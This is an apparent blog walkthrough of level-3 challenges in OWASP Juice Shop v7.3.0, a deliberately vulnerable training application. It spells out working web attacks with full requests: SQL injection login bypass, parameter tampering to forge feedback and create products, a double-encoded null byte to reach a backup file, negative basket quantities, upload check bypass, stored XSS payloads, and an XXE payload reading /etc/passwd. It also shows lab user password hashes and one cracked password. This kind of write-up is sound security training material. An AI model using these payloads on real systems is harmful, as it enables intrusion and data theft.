---
layout: post
title:  "OWASP Juice Shop v7.3.0 - Level 3"
date:   2018-08-07
---

[OWASP Juice Shop](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project)

![level 3](/img/owasp-juice-shop-v7.3.0/juice038.png)

## Blockchain Tier 1

> Learn about the Token Sale before its official announcement.

With limited Angular experience, I think I've only half solved this one. I'm generally familiar the concept of routes in Angular and we can see them defined for [$routeProvider](https://docs.angularjs.org/api/ngRoute/provider/$routeProvider) in juice-shop.min.js.

```
angular.module('juiceShop').config(['$routeProvider',
function (e) {
  'use strict';
  e.when('/administration', {
    templateUrl: 'views/Administration.html',
    controller: 'AdministrationController'
  }),
  e.when('/about', {
    templateUrl: 'views/About.html',
    controller: 'AboutController'
  }),
  e.when('/contact', {
    templateUrl: 'views/Contact.html',
    controller: 'ContactController'
  }),
```

Visiting one of those `templateUrl` values manually, we load a kind of skeletal version of the page.

![tokensale](/img/owasp-juice-shop-v7.3.0/juice039.png)

Towards the end of that $routeProvider block,

```
  e.when('/' + function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 45 - n)
    }).join('')
  }(25, 184, 174, 179, 182, 186) + 36669.toString(36).toLowerCase() + function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 24 - n)
    }).join('')
  }(13, 144, 87, 152, 139, 144, 83, 138) + 10.toString(36).toLowerCase(), {
    templateUrl: 'views/TokenSale.html',
    controller: 'TokenSaleController'
  }),
  e.otherwise({
    redirectTo: '/search'
  })
}
```

I don't have the slightest idea what's going on there, some kind of URL obfuscation. But, we see 'views/TokenSale.html' and can try visiting that directly.

![tokensale](/img/owasp-juice-shop-v7.3.0/juice040.png)

While that page is missing content because the expressions aren't being evaluated, it was enough to trip completion of the challenge.

![tokensale](/img/owasp-juice-shop-v7.3.0/juice041.png)

## Blockchain Tier 1 (Revisited)

Looking back on this, it's pretty easy to find the actual URL and properly visit the ICO page. Looking at the form of these,

```
  e.when('/track-order', {
    templateUrl: 'views/TrackOrder.html',
    controller: 'TrackOrderController'
  }),
```

`e.when` has two arguments: the URL as a string beginning with `/`, and a dictionary containing the templateUrl and controller keys. What we're interested has the same form, except that the URL string is defined as this crazy block,

```
'/' + function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 45 - n)
    }).join('')
  }(25, 184, 174, 179, 182, 186) + 36669.toString(36).toLowerCase() + function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 24 - n)
    }).join('')
  }(13, 144, 87, 152, 139, 144, 83, 138) + 10.toString(36).toLowerCase()
```

Running that in Firefox this returns this error followed by the link \[[Learn More](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Identifier_after_number)\].

```
SyntaxError: identifier starts immediately after numeric literal 
```

I'm a little puzzled why this apparently works as written in juice-shop.min.js and not here, but in any case my solution to this was to wrap the integer literals 36669 and 10 in parenthesis.

```
function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 45 - n)
    }).join('')
  }(25, 184, 174, 179, 182, 186) + (36669).toString(36).toLowerCase() + function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 24 - n)
    }).join('')
  }(13, 144, 87, 152, 139, 144, 83, 138) + (10).toString(36).toLowerCase()
```

...which gets us another error followed by this link \[[Learn More](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Unnamed_function_statement)\]

```
SyntaxError: function statement requires a name
```

I'll take their advice to use an assignment, giving us,

```
$foo = function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 45 - n)
    }).join('')
  }(25, 184, 174, 179, 182, 186) + (36669).toString(36).toLowerCase() + function () {
    var e = Array.prototype.slice.call(arguments),
    t = e.shift();
    return e.reverse().map(function (e, n) {
      return String.fromCharCode(e - t - 24 - n)
    }).join('')
  }(13, 144, 87, 152, 139, 144, 83, 138) + (10).toString(36).toLowerCase()
```

Pasting that in the Javascript console,

![tokensale](/img/owasp-juice-shop-v7.3.0/juice042.png)

And visiting the resulting URL,

![tokensale](/img/owasp-juice-shop-v7.3.0/juice043.png)

I'm sure knowing more about Javascript and Angular would have made this simpler, but there it is.

## Forged Feedback

> Post some feedback in another users name.

'Feedback' can be interpreted to mean the contact form, product reviews, or the complaint form. Explore each to find that the contact form POSTs to `/api/Feedbacks/` so that's probably what we want. Requests look like this,

```
POST /api/Feedbacks/ HTTP/1.1
[...]

{"UserId":9,"comment":"this is totally me!","rating":5,"captcha":"28","captchaId":6}
```

From previous tinkering, the CAPTCHA system appears to be a static bank of challenges and their solutions so I suspect we can just replay this request. Modify the `UserId` to 1 to post as the admin.

```
POST /api/Feedbacks/ HTTP/1.1
[...]

{"UserId":1,"comment":"this is totally me!","rating":5,"captcha":"28","captchaId":6}
```

That's it.

![feedback](/img/owasp-juice-shop-v7.3.0/juice044.png)

For fun and further verification that it worked, we can view the feedback on the `/#/administration` page.

![feedback](/img/owasp-juice-shop-v7.3.0/juice045.png)

## Forgotten Sales Backup

> Access a salesman's forgotten backup file.

Back to our old friend, the `/ftp` directory. 'coupons_2013.md.bak' sounds like what we're looking for.

![feedback](/img/owasp-juice-shop-v7.3.0/juice046.png)

Nope!

Since this is just a simple GET request there isn't a whole lot to try in terms of attack vectors. Throwing in a null character, `%00`, sometimes works. In this case, it took a double encoded null character - `%2500`.

![feedback](/img/owasp-juice-shop-v7.3.0/juice053.png)

It's hard to determine exactly why this works without knowing more about the server and web app internals. In general, there must be multiple layers which process the URL and potentially undo URL encoding. The check for an '.md' suffix must occur before whatever mechanism causes the second round of the URL decoding. In the first pass, the URL ends in '.md' but after a round of decoding `%2500` becomes `%00` so the null character and everything after it is discarded in subsequent processing leaving just `/ftp/coupons_2013.md.bak`.

![feedback](/img/owasp-juice-shop-v7.3.0/juice054.png)

Interestingly, the file name we end up with in Linux is `coupons_2013.md.bak%00.md`.

## Login Bender

> Log in with Bender's user account.

We can use the same hash-finding trick on the `/#/administration` page as before.

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":{"id":3,"email":"bender@juice-sh.op","password":"0c36e517e3fa95aabf1bbffc6744a4ef","createdAt":"2018-08-02T00:52:15.759Z","updatedAt":"2018-08-02T00:52:15.759Z"}}
```

A quick Google'ing of 0c36e517e3fa95aabf1bbffc6744a4ef for the most part only returns posts related to Juice Shop, so I'm going to try something else. If the plain text value is not generally available it seems more likely that this challenge was not intended to be solved via the hash.

We can try repeating the SQLi used on the admin account. Log in with any password and `bender@juice-sh.op'--`.

![bender](/img/owasp-juice-shop-v7.3.0/juice047.png)

Seems like this trick can be used with any account, not sure why there are multiple challenges for it.

## Login Jim

> Log in with Jim's user account.

Back to the hash method for Jim (mostly because his password is awesome).

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":{"id":2,"email":"jim@juice-sh.op","password":"e541ca7ecf72b8d1286474fc613e5e45","createdAt":"2018-08-02T00:52:15.759Z","updatedAt":"2018-08-02T00:52:15.759Z"}}
```

![jim](/img/owasp-juice-shop-v7.3.0/juice048.png)

ncc-1701 - Jim you big nerd.

![jim](/img/owasp-juice-shop-v7.3.0/juice049.png)

## Payback Time

> Place an order that makes you rich.

Getting a negative quantity of an item into your basket feels like the most obvious way to do this. I found that adding a negative quantity for an item outright did not work.

```
POST /api/BasketItems/ HTTP/1.1
[...]

{"ProductId":26,"BasketId":"7","quantity":-100}
```
```
HTTP/1.1 500 Internal Server Error
[...]

{"message":"internal error","errors":["SQLITE_CONSTRAINT: FOREIGN KEY constraint failed"]}
```

But updating the quantity of an existing item was accepted.

```
PUT /api/BasketItems/6 HTTP/1.1
[...]


{"quantity":-100}
```
```
HTTP/1.1 200 OK
[...]

{"status":"success","data":{"id":6,"quantity":-100,"createdAt":"2018-08-02T03:12:28.362Z","updatedAt":"2018-08-02T03:14:31.980Z","BasketId":5,"ProductId":26}}
```

That's a lot of cash back.

![payback](/img/owasp-juice-shop-v7.3.0/juice050.png)

The challenge says we have to place the order, hopefully there are no sanity checks at checkout.

![payback](/img/owasp-juice-shop-v7.3.0/juice051.png)

Nope!

![payback](/img/owasp-juice-shop-v7.3.0/juice052.png)

## Product Tampering

> Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into http://kimminich.de.

Clicking the little eyeball to load the description of a product causes the following request/response pair. I'll remove the `d` parameter as I play with this just to clean things up and because its purpose is unclear.

```
GET /api/Products/9?d=Tue%20Aug%2007%202018 HTTP/1.1
[...]
```

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More...</a>","price":0.01,"image":"orange_juice.jpg","createdAt":"2018-08-02T00:52:16.120Z","updatedAt":"2018-08-02T00:52:16.120Z","deletedAt":null}}
```

We'll try to use a different HTTP verb to update this information. There isn't an example for what the JSON in the body of such a request would look like, but we do have example key/value pairs from the response above as a starting point.

Attempting to send over just a description...

```
PUT /api/Products/9 HTTP/1.1
Host: juice.shop:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*\
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://juice.shop:3000/
Authorization: [...]

{"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
```

HTTP 200 is promising, but the response body contains the unmodified description. Subsequent GET requests also respond with the original description.

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More...</a>","price":0.01,"image":"orange_juice.jpg","createdAt":"2018-08-02T00:52:16.120Z","updatedAt":"2018-08-02T00:52:16.120Z","deletedAt":null}}
```

After much time wasting and a hint from [Dejan](https://dejandayoff.com/) to look at similar POST requests used elsewhere in the application for comparison, I found a small detail was omitted... the Content-Type header. I constructed my PUT request in Burp Repeater from a GET request which would not normally have a Content-Type header seeing as it lacks content!

Adding Content-Type...

```
PUT /api/Products/9 HTTP/1.1
Host: juice.shop:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://juice.shop:3000/
Authorization: [...]

{"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
```

Much better.

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>","price":0.01,"image":"orange_juice.jpg","createdAt":"2018-08-02T00:52:16.120Z","updatedAt":"2018-08-07T16:48:15.494Z","deletedAt":null}}
```

![tampering](/img/owasp-juice-shop-v7.3.0/juice058.png)

A quick note on REST APIs. I expected to use a PATCH verb here since we're performing a partial update (or at least we can assume it's a partial update since we don't know exactly what fields are in an object since we lack an example request). There's a lot of [discussion online](https://stackoverflow.com/questions/19732423/why-isnt-http-put-allowed-to-do-partial-updates-in-a-rest-api) about this and issues related to using PATCH vs PUT for partial updates.

My attempts at PATCH all returned HTTP 500 errors.

```
PATCH /api/Products/9 HTTP/1.1
Host: juice.shop:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://juice.shop:3000/
Authorization: [...]

{"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
```

```
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: application/json; charset=utf-8
Date: Tue, 07 Aug 2018 17:25:46 GMT
Connection: close
Content-Length: 1825

{
  "error": {
    "message": "Unexpected path: /api/Products/9",
    "stack": "Error: Unexpected path: /api/Products/9\n    at /juice-shop/routes/angular.js:9:12\n
    [...]
```

Poorly implemented HTTP verbs may be important to a later challenge, we'll see.

## Reset Jim's Password

> Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.

First, reset the password on an account we control to observe the flow. The password reset form asks for an email address and once one is entered, shows the security question. This data is loaded into the page via a request like this,

```
GET /rest/user/security-question?email=a@a.a HTTP/1.1
[...]
```

```
HTTP/1.1 200 OK
[...]

{"question":{"id":7,"question":"Name of your favorite pet?","createdAt":"2018-08-02T00:52:16.363Z","updatedAt":"2018-08-02T00:52:16.363Z"}}
```

Submitting the answer and a new password,

```
POST /rest/user/reset-password HTTP/1.1
[...]

{"email":"a@a.a","answer":"dogdog","new":"passpass","repeat":"passpass"}
```

```
HTTP/1.1 200 OK
[...]

{"user":{"id":9,"email":"a@a.a","password":"078bbb4bf0f7117fb131ec45f15b5b87","createdAt":"2018-08-02T00:56:00.473Z","updatedAt":"2018-08-02T00:56:00.473Z"}}
```

Nothing here really helps us, except the disclosure of which security question a given user has. From the `/#/administration` page we know Jim's email is jim@juice-sh.op and we see his question is, "Your eldest siblings middle name?"

The hint on the scoreboard says this person is a celebrity. My first thought was [Jim Manico](https://www.owasp.org/index.php/User:Jmanico) since it's hard not go there saying "celebrity Jim" to yourself in an OWASP context. But, a little bit of Google stalking didn't come up with anything...

Recall that we know Jim's password from an earlier challenge and that it's 'ncc-1701.' Think, "Dammit, Jim - I'm a doctor!" and you've got Captain Kirk.

From his [Wiki page](https://en.wikipedia.org/wiki/James_T._Kirk), he has a brother with the middle name 'Samuel.'

> James Tiberius Kirk was born in Riverside, Iowa, in the year 2233,[1] where he was raised by his parents, George and Winona Kirk.[2] Although born on Earth, Kirk lived for a time on Tarsus IV, where he was one of nine surviving witnesses to the massacre of 4,000 colonists by Kodos the Executioner. James Kirk's brother, George Samuel Kirk, is first mentioned in "What Are Little Girls Made Of?" and introduced and killed in "Operation: Annihilate!", leaving behind three children.[3]

Dammit, Jim!

![kirk](/img/owasp-juice-shop-v7.3.0/juice059.png)

In the absence of the hint that Jim is a celebrity and foreknowledge of the 'ncc-1701' password, guessing that it's Captain Kirk would have been impossible. In that case, a brute-force attempt with common names like those in the `/usr/share/dirb/wordlists/others/names.txt` list included with Kali might be an option to explore.

## Upload Size

> Upload a file larger than 100 kB.

Using a random 2.7MB PDF file I had on my desktop as an upload to the complaint form,

![large](/img/owasp-juice-shop-v7.3.0/juice060.png)

This restriction is client-side as no requests containing information about the file or the upload of the file itself are observed in the local proxy.

First, determine the normal flow of things by uploading a file that is under 100K. I'll use a [PDF sample file](https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf) I found online.

```
POST /file-upload HTTP/1.1
Host: juice.shop:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://juice.shop:3000/
Authorization: [...]
X-User-Email: a@a.a
Content-Length: 13484
Content-Type: multipart/form-data; boundary=---------------------------280159537844478784409472582
Cookie: [...]
Connection: close

-----------------------------280159537844478784409472582
Content-Disposition: form-data; name="file"; filename="dummy.pdf"
Content-Type: application/pdf

<file contents here>

-----------------------------280159537844478784409472582--
```

To make a 100K PDF file, I appended 100K or so of random garbage to the end of my small dummy file using `dd`.

```
root@kali ~/JuiceShop# dd if=/dev/urandom of=chunk.dat bs=100K count=1
1+0 records in
1+0 records out
102400 bytes (102 kB, 100 KiB) copied, 0.000758674 s, 135 MB/s
root@kali ~/JuiceShop# ls -alh chunk.dat 
-rw-r--r-- 1 root root 100K Aug  7 11:52 chunk.dat
root@kali ~/JuiceShop# cat dummy.pdf chunk.dat > dummy-chunk.pdf
root@kali ~/JuiceShop# ls -alh dummy-chunk.pdf 
-rw-r--r-- 1 root root 113K Aug  7 11:52 dummy-chunk.pdf
```

Interestingly, the larger dummy file containing the random data opens normally and has a proper thumbnail in the Kali file explorer.

![large](/img/owasp-juice-shop-v7.3.0/juice063.png)

Sending the known-good file upload request over to Burp Repeater, delete the contents of the small file and paste in the larger file using the 'Paste from file' menu item.

![large](/img/owasp-juice-shop-v7.3.0/juice061.png)

Cool.

![large](/img/owasp-juice-shop-v7.3.0/juice062.png)

Finding and disabling or tampering with the client-side code responsible for this check is another potential solution here.

## Upload Type

> Upload a file that has no .pdf extension.

As above, upload a file normally to capture the POST request and send it to Burp Repeater. Replace the contents of the file with some text, and change the 'filename' to something other than PDF.  Keep 'application/pdf' as the Content-Type.

```
POST /file-upload HTTP/1.1
[Host: juice.shop:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://juice.shop:3000/
Authorization: [...]

-----------------------------185727723014332259391007075656
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: application/pdf

what if i'm just a test file :'(

-----------------------------185727723014332259391007075656--
```

Likely the application is checking the Content-Type to confirm it's a PDF, but ignoring the filename (extension) and the contents of the file itself.

![pdf](/img/owasp-juice-shop-v7.3.0/juice064.png)

## XSS Tier 2

> Perform a persisted XSS attack with \<script\>alert(\"XSS\")\</script\> bypassing a client-side security mechanism.

First we have to find somewhere that stores and displays user input and uses a client-side control when accepting that input. Plenty of places take user input but use server-side controls. The product reviews, for example, do not appear to be modified before being sent to the server.

```
PUT /rest/product/23/reviews HTTP/1.1
[...]

{"message":"<script>alert(\"XSS\")</script>","author":"a@a.a"}
```

Viewing that review, we find it is safely encoded. Something must have occurred on the server.

```
<p class="ng-binding">&lt;script&gt;alert("XSS")&lt;/script&gt;</p>
```

The user registration form, however, prevents us from using using an invalid email before any request is sent to the server - it must be evaluating the email address on the client side.

![XSS2](/img/owasp-juice-shop-v7.3.0/juice055.png)

Create a new user with a valid email address to observe the request that is generated.

```
POST /api/Users/ HTTP/1.1
[...]

{"password":"passpass","passwordRepeat":"passpass","securityQuestion":{"id":7,"question":"Name of your favorite pet?","createdAt":"2018-08-02T00:52:16.363Z","updatedAt":"2018-08-02T00:52:16.363Z"},"securityAnswer":"dogdog","email":"b@b.b"}
```

Replay it with the XSS payload.

```
POST /api/Users/ HTTP/1.1
[...]

{"password":"passpass","passwordRepeat":"passpass","securityQuestion":{"id":7,"question":"Name of your favorite pet?","createdAt":"2018-08-02T00:52:16.363Z","updatedAt":"2018-08-02T00:52:16.363Z"},"securityAnswer":"dogdog","email":"<script>alert(\"XSS\")</script>"}
```

```
HTTP/1.1 201 Created
[...]

{"status":"success","data":{"id":12,"password":"078bbb4bf0f7117fb131ec45f15b5b87","email":"<script>alert(\"XSS\")</script>","updatedAt":"2018-08-07T02:48:45.834Z","createdAt":"2018-08-07T02:48:45.834Z"}}
```

HTTP 201 is promising, did it work? Visit the list of users at `/#/administration` to see.

![XSS2](/img/owasp-juice-shop-v7.3.0/juice056.png)

Yep.

![XSS2](/img/owasp-juice-shop-v7.3.0/juice057.png)

## XSS Tier 3

> Perform a persisted XSS attack with \<script\>alert(\"XSS\")\</script\> without using the frontend application at all.

There are a couple clues in the description of this challenge that point to where we need to attack. First, 'persisted XSS' means we're storing user input so we'll want to consider PUT, POST, or similar requests. Second, 'without using the frontend application at all' tells me we're to perform some function that the webapp is not outwardly capable of. That is, do a POST or PUT on something for which we've only previously seen GET requests.

The products API matches this description. I have not seen a feature of the webapp that creates new products.

```
GET /api/Products/1?d=Tue%20Aug%2007%202018 HTTP/1.1
[...]
```

```
HTTP/1.1 200 OK
[...]

{"status":"success","data":{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"image":"apple_juice.jpg","createdAt":"2018-08-02T00:52:16.118Z","updatedAt":"2018-08-02T00:52:16.118Z","deletedAt":null}}
```

As in the Product Tampering challenge, we can surmise the form of a PUT or POST request by looking at the key/value pairs in the JSON of a related GET request like the one immediately above. In this case, we'll try including values for the name, description, price, image, and deletedAt keys. Make sure to include the Content-Type header.

```
POST /api/Products HTTP/1.1
Host: juice.shop:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://juice.shop:3000/
Authorization: [...]

{"name":"n0j sauce","description":"hide yo kids","price":0.99,"image":"apple_juice.jpg", "deletedAt":null}
```

```
HTTP/1.1 201 Created
[...]

{"status":"success","data":{"id":38,"name":"n0j sauce","description":"hide yo kids","price":0.99,"image":"apple_juice.jpg","deletedAt":null,"updatedAt":"2018-08-07T22:22:35.931Z","createdAt":"2018-08-07T22:22:35.931Z"}}
```

HTTP 201 is good - checking the main page for the new product,

![XSS3](/img/owasp-juice-shop-v7.3.0/juice065.png)

Repeat the same request but with the XSS payload in the description.

```
POST /api/Products HTTP/1.1
Host: juice.shop:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://juice.shop:3000/
Authorization: [...]

{"name":"XSS3","description":"<script>alert(\"XSS\")</script>","price":0.99,"image":"apple_juice.jpg", "deletedAt":null}
```

![XSS3](/img/owasp-juice-shop-v7.3.0/juice066.png)

One tiny detail I thought was interesting is that you can witness Angular expressions being evaluated and replaced in the DOM due to the placement of the XSS payload in the description field. Presumably, the expression for the image is evaluated and replaced with the image. Then the expression for the description is replaced with the XSS payload which triggers the alert box. Note that with the alert box present and execution essentially paused, the expression for the price is still visible on the page - '\{\{product.price\}\}.'

![XSS3](/img/owasp-juice-shop-v7.3.0/juice067.png)

Once we close the alert box, the expression for the price is evaluated and replaced by the price and the eyeball and cart buttons are loaded as well. Pretty cool.

![XSS3](/img/owasp-juice-shop-v7.3.0/juice068.png)

## XXE Tier 1

> Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server.

Being an OWASP challenge, let's use a sample XXE payload from the [OWASP XXE page](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).

```
root@kali ~/JuiceShop# cat xxe.xml 
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

Upload this to the complaint form, and voilà.

```
HTTP/1.1 410 Gone
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: application/json; charset=utf-8
Date: Tue, 07 Aug 2018 23:00:13 GMT
Connection: close
Content-Length: 1438

{
  "error": {
    "message": "B2B customer complaints via file upload have been deprecated for security reasons: <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemo... (xxe.xml)",
    "stack": "Error: B2B customer complaints via file upload have been deprecated for security reasons: <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemo... (xxe.xml)\n    at /juice-shop/routes/fileUpload.js:31:16\n    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)\n    at next (/juice-shop/node_modules/express/lib/router/route.js:137:13)\n    at Array.<anonymous> (/juice-shop/node_modules/multer/lib/make-middleware.js:53:37)\n    at listener (/juice-shop/node_modules/on-finished/index.js:169:15)\n    at onFinish (/juice-shop/node_modules/on-finished/index.js:100:5)\n    at callback (/juice-shop/node_modules/ee-first/index.js:55:10)\n    at IncomingMessage.onevent (/juice-shop/node_modules/ee-first/index.js:93:5)\n    at IncomingMessage.emit (events.js:180:13)\n    at endReadableNT (_stream_readable.js:1106:12)\n    at process._tickCallback (internal/process/next_tick.js:178:19)"
  }
}
```

It didn't quite work as the file was truncated, but it did trip completion of the challenge.

![XXE](/img/owasp-juice-shop-v7.3.0/juice069.png)